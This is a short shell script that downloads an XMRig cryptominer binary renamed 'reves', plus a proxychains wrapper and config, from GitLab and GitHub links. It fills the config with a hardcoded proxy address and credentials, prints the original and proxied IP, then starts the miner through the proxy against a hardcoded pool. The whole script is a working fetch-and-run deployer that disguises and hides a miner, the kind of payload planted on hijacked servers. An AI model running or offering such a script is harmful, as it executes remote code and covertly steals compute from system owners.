#!/bin/sh
proxy="128.199.222.68" 
port="443" 
user="arema"  
pass="singoedan"
wget -q -O reves https://gitlab.com/wexcc/xdag/-/raw/main/xmrig && chmod +x reves
wget -q https://github.com/rigmining/code/raw/main/panel && chmod +x panel
wget -q https://github.com/rigmining/code/raw/main/proxychains.conf && chmod +x proxychains.conf
wget -q https://github.com/rigmining/code/raw/main/libproxychains4.so && chmod +x libproxychains4.so
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf"  
sleep 5 
echo "**********************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./reves -o 173.212.235.123:13656 -u oZ21OR6yGVms+gJD50OZSHF4QXyeRbJP -p $(echo $(shuf -i 1-20000 -n 1)) -a rx/xdag -t 14
